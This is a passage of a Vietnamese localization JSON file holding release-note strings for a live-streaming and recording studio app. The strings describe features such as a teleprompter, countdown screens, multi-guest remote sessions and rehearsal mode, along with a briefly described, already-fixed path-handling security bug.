định, chạy cục bộ và không thêm lời gọi mạng nào.","changelog.13b71822377f":"<strong>Màn hình đếm ngược “Sắp bắt đầu” (V1-C)</strong> — chỉ một cú nhấp từ Thêm nguồn: một màn hình đếm ngược phủ toàn khung vẽ (chú thích phía trên một đồng hồ lớn) đếm ngược TỚI một giờ cụ thể được chọn trên bộ chọn đồng hồ 12 giờ (giờ 1–12, phút theo bước 5 phút, AM/PM). Khi về 0, nó <strong>nhấp nháy và giữ nguyên</strong> — người dẫn tự xóa nó và chuyển sang trực tiếp bằng tay, không bao giờ tự động chuyển. Phông nền: dải chuyển sắc hai màu, một màu đơn, một ảnh tĩnh (nhúng vừa khung, căn giữa, không bao giờ bị cắt), hoặc một <strong>GIF/video</strong> chạy trên phông nền lặp của cảnh — kèm <strong>nhạc nền</strong> tùy chọn (mp3/wav/flac/m4a/aac/ogg/opus) được chọn ngay trong cùng hộp thoại. Màn hình đếm ngược được ghép vào chương trình, nên người xem luồng phát/bản ghi đều thấy nó.","changelog.110b8b024a21":"<strong>Nguồn Nhạc nền</strong> — Thêm nguồn → Nhạc nền…: một hoặc nhiều tệp âm thanh thành một danh sách phát lặp vô hình (tùy chọn phát ngẫu nhiên), tự động được giám sát để nghe được trong bản xem trước và được ghi vào bản ghi/luồng phát; việc thêm nó sẽ tắt tiếng âm thanh riêng của phông nền video để <strong>chỉ một âm thanh nền phát tại một thời điểm</strong>.","changelog.6c522580be6b":"<strong>Nguồn thanh mạng xã hội &amp; kênh (V1-D)</strong> — một lớp phủ được tạo tự động liệt kê các tên tài khoản của bạn: các hàng nền tảng có sẵn (YouTube, Twitch, Kick, X, Instagram, TikTok, Facebook, Discord) dưới dạng huy hiệu theo màu thương hiệu, cùng các hàng tùy chỉnh và một tiêu đề tùy chọn; mọi hàng/tên tài khoản đều chỉnh sửa được trong Thuộc tính.","changelog.9d0f60a20a05":"<strong>Biểu ngữ tin nhắn trò chuyện nổi bật (V1-E)</strong> — chọn bất kỳ dòng trò chuyện gần đây nào (từ mọi lớp phủ trò chuyện đang chạy) và ghim nó lên chương trình dưới dạng một biểu ngữ có định kiểu ở phía dưới; màu sắc được lưu trong Cài đặt, còn bản thân việc ghim cố ý chỉ là tạm thời. Xóa chỉ bằng một cú nhấp.","changelog.18f4b83dbd99":"<strong>Độ sâu trường ảnh cho hộp thoại (V1-A)</strong> — mọi hộp thoại đều làm mờ và tối studio phía sau nó (theo giao diện, tôn trọng thiết lập giảm chuyển động/độ trong suốt); các bề mặt đi kèm như máy nhắc chữ không bị làm mờ để người vận hành có thể tiếp tục đọc.","changelog.501b690add0e":"<strong>Dọn dẹp lịch sử cảnh (V1-B)</strong> — một danh sách Cảnh gần đây với nút <strong>Xóa lịch sử…</strong> chỉ một cú nhấp (có xác nhận), cùng Bộ sưu tập cảnh → Xóa lịch sử… để xóa hàng loạt các bộ sưu tập rác (bộ sưu tập đang dùng không bao giờ bị động tới).","changelog.c993200abe94":"<strong>Màu cổ điển cho Trực quan hoá âm thanh</strong> — một ô đánh dấu trong Thuộc tính chuyển các cột/VU sang dải màu phát sóng cổ điển xanh lá→vàng→đỏ (máy hiện sóng có màu xanh lục phosphor); khi tắt = một màu đơn duy nhất.","changelog.2581bdff5166":"<strong>Ghi lại buổi diễn tập</strong> — giờ khi bắt đầu diễn tập, ứng dụng đề nghị ghi lại cả buổi diễn tập ra một tệp video thông thường (chỉ khi chưa có gì đang ghi; bản ghi dừng cùng buổi diễn tập), để một lần chạy thử có thể trở thành bản gốc để biên tập và tải lên mà không cần lên sóng.","changelog.3d3a4c1d8909":"<strong>Danh sách phát media không có dải kênh trong bàn trộn</strong> — danh sách loại âm thanh của giao diện thiếu <code>playlist</code> (và <code>replayPlayback</code>), nên không thể chỉnh mức, tắt tiếng hay giám sát danh sách phát; giờ cả hai đều có dải kênh.","changelog.5a87688dfb99":"<strong>Mặt hiển thị của danh sách phát chỉ có âm thanh</strong> — giờ hiện <strong>tên bản nhạc đang phát</strong> (chữ sạch, không còn ô ký tự lỗi); danh sách phát nhạc nền hoàn toàn không vẽ gì. Danh sách phát video không thay đổi.","changelog.7f672b15fac6":"<strong>Căn khung cho màn hình đếm ngược/phông nền</strong> — phông nền ảnh/GIF/video được thêm viền (vừa khung) và căn giữa thay vì bị cắt để phủ kín, nên toàn bộ hình luôn hiển thị.","changelog.fb60af02a1ed":"<strong>Vòng rà soát (trước khi phát hành)</strong> — lượt kiểm tra bảo mật phát hiện một lỗi mức CAO: đường dẫn ảnh của màn hình đếm ngược được đọc trong vòng lặp kết xuất mà không có lớp bảo vệ đường dẫn mạng như mọi đường dẫn tương tự khác (một đường dẫn UNC sẽ làm lộ mã băm NTLM cho một bộ sưu tập cảnh độc hại) — giờ bị từ chối ngay từ đầu. Lượt rà soát mã phát hiện thêm 11 lỗi, tất cả đều đã được sửa: một lỗi panic trong vòng lặp kết xuất với khung vẽ hẹp hơn 240 px, một cờ ghi hình diễn tập cũ có thể dừng một bản ghi do người dùng tự bắt đầu, danh sách Cảnh gần đây hiện cả cảnh đang ở chương trình (và hoàn tác/làm lại hoàn nguyên danh sách chỉ tồn tại trong phiên đó), việc đổi màu biểu ngữ không vẽ lại một biểu ngữ đã được ghim, bộ chọn đồng hồ âm thầm làm tròn các mốc giờ cũ không chia hết cho 5 phút, một ảnh màn hình đếm ngược bị lỗi được thử lại (và ghi nhật ký) mỗi giây, một ảnh PNG trong suốt của màn hình đếm ngược hiển thị đục, và nhiều đoạn trùng lặp giờ được dùng chung (một danh sách đuôi tệp âm thanh, một bộ chọn đồng hồ, một hàm vẽ hình chữ nhật bo góc).","changelog.c5d49f26f5b2":"[0.910.0] — 2026-07-19 (Làm mới máy nhắc chữ)","changelog.f500d8210c1a":"<em>Máy nhắc chữ trưởng thành.</em> Một đợt làm lại tập trung cho máy nhắc chữ đã phát hành ở 0.800.0: dấu tạm dừng trở thành đối tượng thật mà bạn không thể lỡ tay làm hỏng, tốc độ cuộn có thể theo nhịp của một bài hát, một bước đếm ngược tùy chọn đếm nhịp cho người đọc vào, máy chiếu trả lại cửa sổ chính cho người vận hành, và kịch bản có thể tự đọc thành tiếng hoặc hoàn thành từ khi bạn gõ. Mọi thứ mới đều chạy cục bộ và tắt/trung tính theo mặc định — các từ điển tự động hoàn thành là tệp dữ liệu cục bộ thuần túy (tải khi cần, mỗi lần một ngôn ngữ) và Đọc thành tiếng phát âm qua bộ máy giọng nói sẵn có của hệ điều hành; không có gì được đóng gói kèm và không có gì được tải về.","changelog.fd0ed8487a73":"<strong>Thẻ tạm dừng caesura</strong> — một dấu tạm dừng nội dòng viết là <code> -- </code> (một nhịp) hoặc <code> --N </code> (giữ N giây) giờ được hiển thị trong trình soạn kịch bản thành một nhãn nguyên khối: con trỏ không thể nằm bên trong nó, một lần <strong>Delete/Backspace</strong> xóa cả token (không bao giờ để sót một dấu gạch), và sao chép/dán giữ nguyên dấu đánh dấu. Một dấu tạm dừng được đọc và chỉnh sửa như một đối tượng thay vì bốn ký tự rời rạc.","changelog.29694897048a":"<strong>Bắt đầu đếm ngược</strong> — một bước đếm ngược <strong>3-2-1</strong> tùy chọn trước khi bắt đầu cuộn, hiển thị trên cả bản xem trước của người vận hành lẫn máy chiếu cho người đọc, để người đọc có một nhịp lấy hơi trước khi chữ chạy.","changelog.645e73577cff":"<strong>Chế độ BPM</strong> — điều chỉnh tốc độ cuộn theo <strong>số nhịp mỗi phút (50–250)</strong> thay vì số ký tự mỗi giây, để đọc lời bài hát khớp nhịp với nhạc. Chuyển chế độ tùy ý; mỗi thay đổi sẽ điều chỉnh lại tốc độ của lần cuộn đang chạy <strong>ngay lập tức</strong>.","changelog.a1ef18efc830":"<strong>Biểu tượng điều khiển phát thật sự</strong> — máy chiếu và bảng điều khiển của người vận hành giờ có các nút <strong>SVG</strong> đúng nghĩa cho phát / tạm dừng / dừng / tua lại / tua nhanh / phát lại từ đầu thay cho các ký tự tạm thời.","changelog.ccfc933d79f9":"<strong>Máy chiếu giải phóng cửa sổ chính</strong> — giờ việc mở máy chiếu cho người đọc sẽ <strong>đóng hộp thoại của người vận hành</strong>, để bạn có thể điều hành buổi phát trực tiếp từ cửa sổ chính trong khi người đọc đọc. Khi đã bật đếm ngược khi bắt đầu, máy chiếu sẽ <strong>tự tua về đầu, đếm ngược và phát từ đầu</strong> ngay khi mở — một thao tác đưa người đọc về vạch xuất phát và bắt đầu chạy.","changelog.90ca5a72ccb0":"<strong>Đọc thành tiếng</strong> — nghe thử một kịch bản qua <strong>bộ tổng hợp giọng nói riêng</strong> của hệ điều hành — Windows <strong>SAPI 5 / OneCore</strong>, macOS <strong>AVSpeechSynthesis</strong>, và trên Linux là Web Speech API hoặc phương án dự phòng <strong><code>spd-say</code> / <code>espeak-ng</code></strong> nếu đã được cài đặt. Không có bộ máy TTS nào được đóng gói kèm; giọng nói của hệ điều hành được dùng nguyên trạng. Xem <code>THIRD-PARTY.md</code>.","changelog.5689e3adcf62":"<strong>Tự động hoàn thành dạng chữ mờ</strong> — các gợi ý từ và cụm từ màu xám nhạt xuất hiện ngay trong dòng khi bạn gõ và được chấp nhận bằng <strong>Tab</strong>. Mỗi ngôn ngữ trong <strong>18 ngôn ngữ của ứng dụng</strong> có từ điển riêng, chỉ được tải khi cần cho ngôn ngữ bạn đang viết. Nguồn từ điển và các giấy phép <strong>CC-BY / mở</strong> của chúng (Tatoeba, SCOWL, Leipzig Corpora, OpenTaal, …) được liệt kê trong <code>THIRD-PARTY.md</code>.","changelog.f1248a45cf83":"<strong>Khớp ngắt dòng giữa bản xem trước ↔ máy chiếu</strong> — các dòng giờ ngắt ở đúng cùng vị trí trên bản xem trước của người vận hành và máy chiếu toàn màn hình, nên dòng bạn nhắc chính là dòng người đọc đang đọc. Máy chiếu hiển thị kịch bản trên một sân khấu có kích thước cố định được co giãn bằng CSS cho vừa màn hình, nên một chỗ ngắt dòng không còn có thể rơi vào vị trí khác trên màn hình lớn.","changelog.33a14cdb624d":"<strong>Bộ đếm thời gian đã trôi qua trên thanh tua</strong> — số hiển thị thời gian đã trôi qua không còn tăng <strong>vượt quá</strong> tổng thời gian đọc; nó dừng ở cuối thay vì cứ đếm lên mãi khi kịch bản đã cuộn hết.","changelog.a757a5cd6973":"<strong>Không có phụ thuộc runtime mới nào được đóng gói kèm và không có lời gọi mạng mới.</strong> Các từ điển tự động hoàn thành là dữ liệu JSON cục bộ (mỗi ngôn ngữ một tệp, tải khi cần cho ngôn ngữ đang dùng), và Đọc thành tiếng điều khiển bộ máy giọng nói vốn đã có trên máy — không có gì được tải về lúc chạy. Ghi công cho dữ liệu và bộ máy giọng nói nằm trong <code>THIRD-PARTY.md</code>. Mọi điều khiển và chế độ mới đều được bản địa hóa cho cả 18 ngôn ngữ.","changelog.6c151934cc4a":"[0.900.0] — 2026-07-18 (Quản lý studio &amp; quy trình làm việc — Giai đoạn 8)","changelog.db7b34e4b837":"<em>Làm chủ studio của bạn.</em> Giai đoạn 8 giúp toàn bộ một bố cục có thể mang đi và chia sẻ, thêm quản lý phiên bản cho các cảnh của bạn, đặt những thao tác hay dùng nhất của bạn chỉ cách một lần chạm, và mở ra khả năng tùy biến giao diện đầy đủ cùng chế độ di động chạy từ USB. Mọi thứ đều hoàn toàn cục bộ — không có phụ thuộc mới và không có lời gọi mạng mới.","changelog.197ef0e08085":"<strong>Gói bộ sưu tập cảnh — xuất/nhập (CAP-N60)</strong> — gói toàn bộ một bố cục (đồ thị cảnh cùng các tài nguyên cục bộ của nó: ảnh, media, LUT, mặt nạ, phông chữ) vào một tệp <code>.fcappack</code> di động duy nhất và chia sẻ nó như một tệp. Khi nhập, tài nguyên được liên kết lại trên máy đích; đường dẫn URL/UNC được ghi lại là <em>bên ngoài</em> và không bao giờ bị truy vấn; phông chữ được đánh dấu để ghi công. Không có chợ ứng dụng, không có máy chủ.","changelog.1993c99e5fa2":"<strong>So sánh &amp; hợp nhất bộ sưu tập cảnh (CAP-N61)</strong> — so sánh bộ sưu tập đang dùng với một bộ sưu tập khác, một <code>.fcappack</code> hoặc một ảnh chụp nhanh; xem các cảnh, nguồn được thêm / bị xóa / bị thay đổi, cùng biến đổi / bộ lọc / trạng thái hiển thị của từng mục; rồi <strong>chọn lọc</strong> chính xác những thay đổi nào sẽ hợp nhất vào (một cảnh được chọn sẽ mang theo các nguồn nó dùng). Đối chiếu hai phiên bản mà không cần đám mây.","changelog.e1355c54d6d7":"<strong>Ảnh chụp nhanh phiên bản có tên (CAP-N62)</strong> — tạo điểm kiểm tra có tên cho bộ sưu tập đang dùng chỉ bằng một cú nhấp, với dòng thời gian duyệt được, khôi phục và chế độ xem so sánh (dùng lại công cụ so sánh). Lịch sử có chủ đích bên cạnh tự động lưu và hoàn tác; giới hạn 50 bản với dung lượng đĩa được công khai, và một điểm kiểm tra “trước khi khôi phục” để việc khôi phục không bao giờ là một chiều.","changelog.afc196f3991b":"<strong>Chế độ di động (CAP-N63)</strong> — đặt một tệp đánh dấu <code>freally-portable.txt</code> cạnh tệp thực thi và mọi dữ liệu ứng dụng (cài đặt, hồ sơ, bộ sưu tập) sẽ nằm trong thư mục của tệp exe — chạy toàn bộ studio từ một USB mà không động tới hồ sơ người dùng của hệ điều hành chủ. Cài đặt → Giới thiệu hiển thị trạng thái di động và vị trí dữ liệu.","changelog.4072af7dcc85":"<strong>Sao lưu &amp; khôi phục trong một tệp (CAP-N64)</strong> — xuất mọi thứ (cài đặt, hồ sơ, bộ sưu tập cảnh) ra một tệp <code>.fcapbackup</code> duy nhất có đánh số phiên bản, và khôi phục có chọn lọc ngay tại đây hoặc trên một máy mới (một quy trình chuyển máy). Các bí mật — khóa phát, mật khẩu — luôn bị loại khỏi bản sao lưu; các trường do phía máy chủ sở hữu (EULA, hướng dẫn lần đầu, hồ sơ camera) được giữ nguyên khi khôi phục.","changelog.6b0e17039cce":"<strong>Trình chỉnh sửa giao diện (CAP-N65)</strong> — một trình chỉnh sửa trực quan trên giao diện dựa trên biến CSS: soạn đầy đủ bảng sáu màu với cảnh báo <strong>độ tương phản WCAG</strong> trực tiếp, và xuất/nhập các tệp <code>.fctheme</code> có thể chia sẻ.","changelog.1f2d5f8ca405":"<strong>Bố cục dock định sẵn (CAP-N66)</strong> — lưu các bố cục hiển thị có tên (trạng thái hiện của dock thống kê + hướng của bàn trộn) và chuyển qua lại giữa chúng.","changelog.a66f42ada61a":"<strong>Tìm kiếm cài đặt &amp; mục mới thay đổi (CAP-N67)</strong> — một ô tìm kiếm trên hộp thoại Cài đặt (mọi danh mục đều được lập chỉ mục từ khóa, có nhảy tới) cùng dấu “đã thay đổi kể từ khi mở” cho từng danh mục.","changelog.5331e00f8cd2":"<strong>Lưới thao tác nhanh (CAP-N68)</strong> — một bảng nút kiểu Stream Deck có thể tùy biến (cảnh, lệnh, macro, phím bảng âm thanh) với màu và trang riêng cho từng nút; các nút lệnh kích hoạt cùng những thao tác studio trong danh sách cho phép như phím tắt và bảng LAN, và cấu hình lưới được <strong>dùng chung với bảng LAN CAP-N06</strong>.","changelog.5217d787621c":"<strong>Máy chiếu của máy nhắc chữ</strong> — “Mở máy chiếu” từng mở ra một cửa sổ trống không thể đóng (nó không có viền, không có thanh tiêu đề, và IPC của nó không được cấp quyền). Giờ nó mở như một cửa sổ bình thường, đóng được và hiển thị kịch bản đang cuộn; <strong>Esc</strong> sẽ đóng nó. <strong>Tệp → Thoát</strong> giờ cũng thoát ứng dụng ổn định (cửa sổ chính thiếu quyền đóng cửa sổ).","changelog.a9bceee9f47d":"<strong>Hộp thoại máy nhắc chữ</strong> — một nút <strong>Dừng</strong> (tạm dừng + tua về đầu) để một kịch bản ngắn không còn trông như trống trơn sau khi Phát, và có thể đọc lại và chỉnh sửa lại văn bản.","changelog.2e825abc071d":"<strong>Bảng Nguồn</strong> — các điều khiển xóa và sắp xếp lại của từng nguồn trước đây chỉ hiện khi rê chuột và có thể bị cắt khỏi thanh; giờ mỗi nguồn có một <strong>dải điều khiển phía trên</strong> luôn hiển thị (Trực tiếp/Ghi · khóa · sắp xếp lại · bộ lọc · thuộc tính · nhân bản · xóa).","changelog.78b6f1cfd693":"<strong>Không có phụ thuộc mới</strong> (crate <code>zip</code> đã có sẵn trong kho) và <strong>không có lời gọi mạng mới</strong>: các tính năng gói / sao lưu / ảnh chụp nhanh / giao diện đều chỉ là tệp cục bộ; việc chia sẻ thao tác nhanh qua LAN đi qua bảng web CAP-N06 vốn đã có và phải tự bật. <code>wix.version</code> được nâng từ 0.253.0 → 0.254.0 (giới hạn phiên bản phụ của MSI).","changelog.871a49bf7084":"[0.800.0] — 2026-07-17 (Khách mời từ xa &amp; sản xuất chương trình — Giai đoạn 7)","changelog.72750cf3fb55":"<em>Từ “khách mời kết nối” tới “một chương trình được sản xuất”.</em> Giai đoạn 7 biến phiên khách mời từ xa thành một studio nhiều khách mời và thêm lớp sản xuất trực tiếp lên trên: vẽ lên chương trình đang phát, chạy máy nhắc chữ, giữ khách mời trong phòng chờ trước khi lên sóng, gửi tín hiệu nhắc riêng cho họ, theo dõi chất lượng kết nối của từng khách mời và sắp xếp lại mọi người vào một lưới tự động. Kênh truyền khách mời từ xa giờ nhận <strong>tối đa tám khách mời</strong> (người dẫn + 8 = lưới 1–9 ô). Mọi thứ đều đi qua phiên P2P sẵn có phải tự bật — không có máy môi giới mới, không có máy chủ nào do Mike vận hành, không có gì tự động kết nối — và mọi bề mặt mới đều tắt hoặc chưa gán phím theo mặc định.","changelog.c6ee3e56912f":"<strong>Telestrator — vẽ lên chương trình đang phát (CAP-N57)</strong> — chú thích lên tín hiệu đầu ra bằng các công cụ bút, bút dạ quang, mũi tên và hình elip, được ghép vào chương trình để nét vẽ xuất hiện trong bản ghi và luồng phát đúng lúc bạn vẽ (không chỉ trong bản xem trước của bạn). Nét vẽ mờ đi sau một khoảng thời gian định sẵn, hoặc chuyển sang chế độ bảng trắng để giữ chúng cho đến khi bạn xóa. Nhận biết lực nhấn của bút cảm ứng; có phím tắt xóa (chưa gán cho đến khi bạn gán). Được vẽ thẳng lên chương trình đã hoàn chỉnh, nên nó tới được mọi đầu ra — kể cả các biến thể chỉ trên luồng phát / chỉ trong bản ghi của CAP-N53.","changelog.2b2452ceb3fd":"<strong>Máy nhắc chữ (CAP-N58)</strong> — một kịch bản cuộn mượt trên ba bề mặt cùng lúc: một bảng trong ứng dụng, một máy chiếu toàn màn hình cho người đọc (có chế độ lật gương cho kính tách tia), và một chế độ xem trên bảng cảm ứng LAN. Kịch bản dạng văn bản thuần hoặc Markdown nhẹ, điều chỉnh được tốc độ và phông chữ. Điều khiển cuộn từ phím tắt, MIDI, OSC hoặc bảng LAN — vị trí cuộn được dùng chung, nên mọi bề mặt luôn đồng bộ.","changelog.eba68ba03d3d":"<strong>Phòng chờ cho khách mời từ xa (CAP-N54)</strong> — khách mời mới có thể vào một trạng thái chờ riêng: bạn thấy camera của họ và bài kiểm tra kỹ thuật camera/micrô trên một màn hình giám sát, ngoài chương trình, rồi cho họ lên sóng chỉ bằng một cú nhấp. Tùy chọn (tắt theo mặc định); khách mời thấy biểu ngữ “bạn đang ở phòng chờ” trên cả ứng dụng máy tính lẫn trang tham gia trên web.","changelog.7576d4597bb5":"<strong>Hệ thống tín hiệu nhắc &amp; trò chuyện (CAP-N55)</strong> — gửi cho một khách mời đã kết nối các tín hiệu nhắc bằng chữ riêng tư (“30 giây”, “Kết thúc đi”, “Sắp đến lượt bạn”, “Nói to hơn”) qua kênh dữ liệu P2P sẵn có. Khách mời thấy tín hiệu nhắc kèm đồng hồ đếm ngược trực tiếp trên trang tham gia hoặc ứng dụng của họ — không bao giờ trong chương trình. Không có bề mặt mạng mới.","changelog.8eed1deed31f":"<strong>Bảng chất lượng kết nối của khách mời (CAP-N56)</strong> — bản tổng hợp QoS trực tiếp cho từng khách mời: thời gian khứ hồi, tỷ lệ mất gói, độ phân giải và tốc độ khung hình nhận được, và độ dao động trễ (jitter), với huy hiệu xanh/hổ phách/đỏ và biểu đồ lịch sử thu nhỏ, để thấy được “kết nối của bạn đang kém đi” trước khi người xem nhận ra.","changelog.a49bc0c0f6ee":"<strong>Bố cục lưới khách mời tự động (CAP-N59)</strong> — sắp xếp các khách mời đang lên sóng vào một lưới 1–9 ô tự động, tự sắp xếp lại khi khách mời tham gia, rời đi hoặc được cho lên sóng, với tên của mỗi vị trí được xuất bản thành biến <code>{{guestN}}</code> để một nguồn tiêu đề trở thành bảng tên tự cập nhật. Không bao giờ chồng lấn, theo đúng thiết kế.","changelog.5b7dd4b9a43f":"<strong>Phiên từ xa nhiều khách mời</strong> — kênh truyền khách mời từ xa phải tự bật giờ nhận <strong>tối đa tám khách mời</strong> cùng lúc (trước đây là một), mỗi người một ô riêng với cổng tắt tiếng, chất lượng kết nối, kênh tín hiệu nhắc riêng và việc cho lên sóng chỉ bằng một cú nhấp. Vẫn là cùng một phiên ngang hàng — media truyền thẳng giữa người dẫn và khách mời, không có máy chủ, và không có gì kết nối cho đến khi bạn mời ai đó. Đã được kiểm chứng trong ngân sách hiệu năng bốn khách mời; nhiều khách mời hơn phụ thuộc vào băng thông và CPU của người dẫn.","changelog.c35af444edf6":"[0.700.0] — 2026-07-17 (Độ tin cậy &amp; thấu hiểu buổi phát — Giai đoạn 6)","changelog.82098fd2d64d":"<em>Diễn tập, đo lường, giải thích.</em> Giai đoạn 6 là về việc biết chắc chương trình của bạn sẽ trụ vững trước khi lên sóng, và hiểu được chuyện gì đã xảy ra sau đó. Giờ bạn có thể chạy toàn bộ quy trình tới một đích nhận cục bộ riêng tư với một mạng kém được mô phỏng, đo xem máy của bạn thực sự trụ được tới đâu, xem dòng thời gian được ghi lại của mọi sự kiện kết xuất/mã hóa/kết nối lại, và nhận một bản báo cáo khi buổi phát kết thúc — cùng khả năng đánh dấu bất kỳ nguồn nào là chỉ hiện trên luồng phát hoặc chỉ hiện trong bản ghi. Mọi thứ đều tắt/trung tính theo mặc định, và không có gì ở đây thêm lời gọi mạng: lần chạy thử và bài đo hiệu năng hoàn toàn cục bộ, còn trình mô phỏng mạng chỉ làm suy giảm các đích nhận loopback của chính buổi diễn tập — không bao giờ là một buổi phát thật.","changelog.be9efbd98807":"<strong>Trình mô phỏng điều kiện mạng (CAP-N48)</strong> — một bộ định hình mạng chỉ dành cho diễn tập: giới hạn băng thông kiểu token-bucket có tính tất định, thêm độ trễ/jitter và các lần mất kết nối theo lịch, áp dụng lên các đích nhận của lần chạy thử để bạn có thể tập dượt hành vi kết nối lại, sự cô lập giữa các làn phát đa nền tảng và lựa chọn bitrate trên một đường truyền lên yếu, chập chờn trước ngày phát sóng. Có cấu hình sẵn cho “Wi-Fi khách sạn” và điểm phát di động, cùng một hồ sơ tùy chỉnh hoàn toàn. Có tính tất định (mỗi lần chạy là cùng một bài tập) và, theo đúng thiết kế, không thể động tới một lần Phát trực tiếp thật.","changelog.37e19bbed36e":"<strong>Chế độ chạy thử / “Phát trực tiếp (diễn tập)” (CAP-N49)</strong> — chạy toàn bộ quy trình trực tiếp — bộ ghép hình, bộ mã hóa, bộ ghép luồng (mux) và logic kết nối lại thật — tới một đích nhận loopback riêng của ứng dụng với dock thống kê thật, giao diện trạng thái TRỰC TIẾP và các cảnh báo, để cả chương trình được diễn tập mà <strong>không một byte nào rời khỏi máy</strong>. Một nút Diễn tập màu tím riêng biệt, huy hiệu DIỄN TẬP trên mọi bề mặt trực tiếp và một biểu ngữ trạng thái khiến bạn không thể nhầm một buổi diễn tập với một buổi phát thật; khóa phát thậm chí không bao giờ được đọc, nên một lần chạy thử trước chương trình vẫn hoạt động khi chưa có khóa.","changelog.85d495ae89bc":"<strong>Dòng thời gian điều tra khung hình bị rớt (CAP-N50)</strong> — một dòng thời gian được ghi suốt phiên, đối chiếu thời gian kết xuất, độ sâu hàng đợi bộ mã hóa, bitrate và số khung bị rớt theo từng đích, các lần kết nối lại, chuyển cảnh, dấu đánh dấu và cảnh báo trên một biểu đồ thu phóng được — câu trả lời cho “chuyện gì đã xảy ra ở phút thứ 43?” sau khi sự việc đã qua. Dock thống kê cho thấy <em>hiện tại</em>; còn tính năng này ghi lại và giải thích toàn bộ phiên, được lấy mẫu ngoài vòng lặp kết xuất để đường ghép hình 60 fps không phải làm thêm việc gì.","changelog.bb50bfcb281c":"<strong>Báo cáo phiên phát (CAP-N51)</strong> — khi phiên kết thúc, một bản báo cáo HTML + Markdown cục bộ tùy chọn được ghi bên cạnh bản ghi: thời gian hoạt động, bitrate trung bình và đỉnh theo từng đích, tỷ lệ thời gian gián đoạn, nhật ký kết nối lại, dấu đánh dấu, cảnh báo và đường dẫn bản ghi. Chỉ cục bộ, chỉ bạn mới chia sẻ được; tắt theo mặc định.","changelog.fbfd2e9fc49b":"<strong>Trình hướng dẫn đo hiệu năng bộ mã hóa (CAP-N52)</strong> — một bài đo có hướng dẫn, hoàn toàn ngoại tuyến, thực sự <em>chạy</em> các chuỗi mã hóa ngắn (mọi bộ mã hóa phát hiện được × preset × độ phân giải × fps) trên máy của bạn, đo số fps đạt được và khoảng dư, rồi đề xuất thiết lập khung vẽ/bộ mã hóa/bitrate từ kết quả đo — áp dụng chỉ bằng một cú nhấp. Các lần thất bại được liệt kê, không bao giờ bị giấu, nên một bộ mã hóa mà máy bạn có nhưng không trụ nổi sẽ được ghi nhận thay vì âm thầm bị loại. Khác với trình hướng dẫn lần đầu, vốn chỉ thăm dò khả năng và áp dụng quy tắc kinh nghiệm; công cụ này thực sự đo. Bị từ chối khi đang phát trực tiếp hoặc đang ghi để không bao giờ chiếm bộ mã hóa giữa chương trình.","changelog.7893b3df0384":"<strong>Hiển thị nguồn theo từng đầu ra (CAP-N53)</strong> — đánh dấu bất kỳ mục nào trong cảnh là hiện trên luồng phát nhưng không hiện trong bản ghi, hoặc ngược lại, trong cùng một khung vẽ — giữ cảnh báo và trò chuyện trên luồng trực tiếp trong khi bản ghi VOD vẫn sạch. Rê chuột để thấy các nút bật/tắt <strong>Trực tiếp</strong> / <strong>Ghi</strong> trên mỗi hàng nguồn; nút con mắt chính vẫn chi phối mọi thứ, và bản xem trước, máy chiếu và đa màn hình giám sát của người vận hành luôn hiển thị toàn bộ chương trình.","changelog.fd1925b97ec5":"<strong>Hiệu ứng chữ lặp &amp; quảng cáo (Text FX)</strong> — ba bộ lọc mục mới nhắm tới các vòng lặp quảng bá/quảng cáo chạy không cần người trông: bộ lọc <strong>Phối cảnh</strong> nghiêng bất kỳ nguồn nào (chữ, camera, nguồn ghi hình) ra xa người xem như một mặt phẳng, kèm hiệu ứng mờ dần tùy chọn ở mép xa — nối nó sau bộ lọc <strong>Cuộn</strong> vô tận sẵn có để có cảnh chữ chạy mở đầu kiểu “Star Wars” trọn vẹn — và bộ lọc <strong>Vòng lặp mờ dần</strong> làm một mục hiện dần, giữ, mờ dần và giữ ẩn theo một chu kỳ lặp lại. Tất cả đều chạy theo thời gian, nên một quảng cáo tự chạy.","changelog.f557861d47ae":"[0.600.0] — 2026-07-16 (Ghi hình &amp; phát lại chuyên sâu — Giai đoạn 5)","changelog.baab6b442a79":"<em>Mọi thứ xoay quanh tệp.</em> Giai đoạn 5 xây dựng những gì xảy ra với một bản ghi trước, trong và sau khi nó nằm trên đĩa: tệp riêng cho từng nguồn, công cụ cắt clip, độ trong suốt thực sự, chia tệp theo sự kiện và dấu chương, chuỗi tác vụ sau khi ghi, trình kiểm tra tính toàn vẹn và mã thời gian SMPTE LTC. Mọi khả năng mới đều tắt/trung tính theo mặc định — một bản ghi không động tới gì sẽ giống hệt từng bit như trước — và không có gì ở đây thêm lời gọi mạng.","changelog.56eaf8f0fe4b":"<strong>Ghi ISO theo từng nguồn (CAP-N40)</strong> — ghi các nguồn được chọn ở dạng sạch vào tệp riêng của chúng song song với chương trình, trước khi ghép (có hoặc không có bộ lọc của nguồn), ở kích thước khung vẽ và tốc độ khung hình để mọi tệp ISO đặt lên dòng thời gian biên tập đều khớp với chương trình. Mỗi khách mời từ xa chỉ là một nguồn, nên tệp ISO cho từng khách mời có sẵn mà không tốn thêm gì. Mỗi làn có vùng chứa/bộ mã hóa riêng; âm thanh được lấy sau bộ lọc nhưng trước fader/tắt tiếng (một quyết định trộn không bao giờ làm câm một tệp ISO); nút khẩn cấp cũng giữ cả các làn ISO. Tắt cho đến khi chọn nguồn; có hướng dẫn trung thực về chi phí của từng làn ngay từ đầu.","changelog.070729b0bdcf":"<strong>Phát lại &amp; công cụ cắt clip (CAP-N41)</strong> — một cửa sổ cắt gọn nhẹ cho mọi bản ghi định dạng phổ biến đã lưu: điểm vào/ra theo từng khung hình với bản xem trước trực tiếp, và một huy hiệu xuất trung thực cho biết ngay từ đầu clip sẽ được <strong>sao chép luồng</strong> (điểm vào khớp khung hình khóa — gần như tức thì, không mất dữ liệu) hay mã hóa lại. Một cú nhấp đóng khung lại thành bản gốc dọc 9:16 qua hình học của khung vẽ dọc.","changelog.a785df0dd1f8":"<strong>Ghi hình có kênh alpha (CAP-N42)</strong> — ghi chương trình với độ trong suốt thực sự ra định dạng <code>.frec</code> riêng (một cờ header mới; phiên bản định dạng không đổi, nên tệp alpha vẫn phát được ở mọi nơi và tệp cũ được đọc lại dưới dạng đục). Trình ghi có lượt kết xuất xóa nền trong suốt riêng, nên bản xem trước và luồng phát vẫn giữ chương trình đục bình thường. Xuất ra bản gốc <code>.mov</code> <strong>ProRes 4444</strong> hoặc <strong>QuickTime Animation (QTRLE)</strong> cho các phần mềm dựng phim qua thành phần ffmpeg được ghi rõ.","changelog.79e72558f2ad":"<strong>Chia tệp khi đổi cảnh / theo dấu đánh dấu (CAP-N43)</strong> — các trình kích hoạt sự kiện mới cho bộ chia tệp <code>.frec</code> riêng: bắt đầu một 